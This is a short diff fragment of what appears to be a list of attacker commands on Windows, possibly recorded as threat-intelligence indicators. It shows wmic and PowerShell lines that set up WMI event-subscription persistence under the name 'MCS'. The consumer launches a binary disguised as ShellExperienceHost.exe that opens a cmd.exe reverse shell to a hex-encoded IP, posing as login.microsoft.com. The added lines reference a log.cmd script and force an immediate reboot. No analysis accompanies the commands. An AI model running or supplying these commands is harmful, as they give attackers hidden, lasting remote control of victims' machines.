@@ -37,3 +37,6 @@ wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filt
 powershell.exe -NoProfile -Command "Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{Name='MCS'; EventNamespace='root\cimv2'; QueryLanguage='WQL'; Query='SELECT * FROM __InstanceModificationEvent WITHIN 200 WHERE TargetInstance ISA ''Win32_PerfFormattedData_PerfOS_System'''} | Out-Null"
 powershell.exe -NoProfile -Command "Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name='MCS'; CommandLineTemplate='%ProgramData%\config..\ShellExperienceHost.exe --ssl-servername login.microsoft.com --ssl -n 0xc17c21b4 448 -e cmd.exe'} | Out-Null"
 powershell.exe -NoProfile -Command "Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter='__EventFilter.Name=\"MCS\"'; Consumer='CommandLineEventConsumer.Name=\"MCS\"'} | Out-Null"
+
+C:\ProgramData\USOShared\log.cmd
+powershell.exe -command "Restart-Computer -Force" & shutdown /r /f /t 0
